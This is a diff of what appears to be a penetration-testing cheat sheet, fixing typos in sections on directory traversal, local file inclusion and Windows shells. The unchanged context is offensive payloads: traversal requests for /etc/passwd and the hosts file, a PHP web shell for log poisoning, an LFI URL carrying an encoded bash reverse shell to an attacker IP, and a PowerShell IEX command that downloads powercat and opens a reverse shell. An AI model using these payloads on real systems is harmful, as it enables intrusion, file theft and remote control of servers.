@@ -1,6 +1,6 @@
 # Directory traversal
 
-Example: `curl http://vulnsite/index.php?page=../../../../../../etc/passwd`
+Example: `curl http://vulnsite/index.php?page=../../../../../../etc/passwd` \
 Windows (check both `/` and `\`):
 ```
 curl http://vulnsite/index.php?page=..\..\..\..\..\..\Windows\System32\drivers\etc\hosts
@@ -15,11 +15,11 @@ Apache 2.4.49 CVE: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773
 
 ### Local file inclusion
 
-Php snipet:
+Php snippet:
 ```
 <?php echo system($_GET['cmd']);?>
 ```
-and poison the log files with a Header (e.g. [User-Agent](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/User-Agent)) or another user controled field. Then traverse the directories to the log file:
+and poison the log files with a Header (e.g. [User-Agent](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/User-Agent)) or another user controled field. Then traverse directories to the log file:
 ```
 http://sitetohack/index.php?page=../../../../../../../../../../var/log/apache2/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F___AttackerIP___%2F___AttackerPort___%200%3E%261%22
 ```
@@ -73,7 +73,7 @@ Overwrite ssh keys in `/home/someuser/.ssh/authorized_keys`
 Cmd or PowerShell: ``(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell`` \
 Invoke-Expression, or IEX: https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.3 \
 PowerCat: 
-- https://github.com/besimorhino/powercat/blob/master/powercat.ps1
+- on GitHub: https://github.com/besimorhino/powercat/blob/master/powercat.ps1
 - in Kali: `/usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1`
 ```
 IEX (New-Object System.Net.Webclient).DownloadString("http://$AttackerIp/powercat.ps1");powercat -c $AttackerIp -p $AttackerPort -e powershell
